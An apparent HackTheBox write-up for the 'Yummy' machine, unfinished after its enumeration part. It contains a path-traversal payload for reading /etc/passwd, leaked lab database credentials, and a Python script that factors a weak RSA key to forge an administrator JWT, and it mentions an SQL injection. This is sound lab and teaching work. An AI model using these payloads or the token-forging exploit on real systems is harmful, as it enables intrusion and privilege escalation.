# Part 1: Enumeration

Starting with an **Nmap scan**:

![NMAP](/static/writeups/HTB-S-VI/yummy/1.png)

Nmap reveals that ports 22 and 80 are open. I began exploring the website, `yummy.htb`. After adding this entry to `/etc/hosts`, I used `dirsearch` but found nothing significant. However, I discovered a **local file traversal vulnerability** in the "save iCalendar" functionality, accessible after booking a table.

![LFI Vulnerability](/static/writeups/HTB-S-VI/yummy/2.png)

Intercepting the request with **Burp Suite**, I tested a payload to access `/etc/passwd`:

```
GET /export/../../../../../etc/passwd
```

This response returned the contents of `/etc/passwd`:

![Passwd File](/static/writeups/HTB-S-VI/yummy/3.png)

Since I could access any files, I searched for valuable files and found something interesting in `/etc/crontab`:

![Crontab](/static/writeups/HTB-S-VI/yummy/4.png)
![Crontab Details](/static/writeups/HTB-S-VI/yummy/5.png)

### Exploring `/data/scripts`

I explored the `data/scripts` directory and found `table_cleanup.sh`, which cleans tables in MySQL. It also contains credentials for the database:

![Cleanup Script](/static/writeups/HTB-S-VI/yummy/16.png)

In `dbmonitor.sh`, I found a script that checks if the MySQL service is down and restarts it if needed:

![DB Monitor Script](/static/writeups/HTB-S-VI/yummy/18.png)

`app_backup.sh` goes to `/var/www/` directory and zips content of `/opt/app` as `backupapp.zip` file:

![Backup App](/static/writeups/HTB-S-VI/yummy/7.png)

Extracting `backupapp.zip` provided the web application’s source code. Here are the files:

![Extracted Files](/static/writeups/HTB-S-VI/yummy/9.png)

In `app.py`, I located the same database credentials as those in `cleanup.sh`:

```
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS
}
```

### JWT Vulnerability

In the `config` folder, the `signature.py` file revealed session token generation logic.

Code:

```
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

Upon decoding the JWT token in base64, the `n` value of the RSA encryption was exposed:

![JWT Decoding](/static/writeups/HTB-S-VI/yummy/12.png)

Modifying the role to `administrator` was initially unsuccessful due to signature verification, which hashes the payload and header with a secret key. However, with access to the `n` value, I modified `signature.py` to create an admin token.

Using the following Python script, I generated a modified JWT with administrator privileges:

```
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import jwt
import base64

# Your session token
original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...<trimmed>"

# Decoding and modifying the JWT
n = int(s.split('"n":')[1].split('"')[1])
e = 65537
factors = sympy.factorint(n)
p, q = list(factors.keys())
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key = RSA.construct((n, e, d, p, q))
signing_key = key.export_key()

# Modifying role to administrator
decoded_payload = jwt.decode(
    original_jwt,
    signing_key,
    algorithms=["RS256"],
    options={"verify_signature": False}
)
decoded_payload['role'] = 'administrator'
new_jwt = jwt.encode(decoded_payload, signing_key, algorithm='RS256')
print("Modified JWT with administrator role:", new_jwt)
```

Using the new token in `x-auth` for `/admindashboard`, I accessed the admin panel:

![Admin Panel](/static/writeups/HTB-S-VI/yummy/13.png)

The admin panel contained limited functionality, but I identified an error-based SQL injection vulnerability in the search function.

![SQL Injection](/static/writeups/HTB-S-VI/yummy/14.png)

With this SQL injection vulnerability, I planned to escalate further.

---

### Part 2: Foothold

**To be updated...**
